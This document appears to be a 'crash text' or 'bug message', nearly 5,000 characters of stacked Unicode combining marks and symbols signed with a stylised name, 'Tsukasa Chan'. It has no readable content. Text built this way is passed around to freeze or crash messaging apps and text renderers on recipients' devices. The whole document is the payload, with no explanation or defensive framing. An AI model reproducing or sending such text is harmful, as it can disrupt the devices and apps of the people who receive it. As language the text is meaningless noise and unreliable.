⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝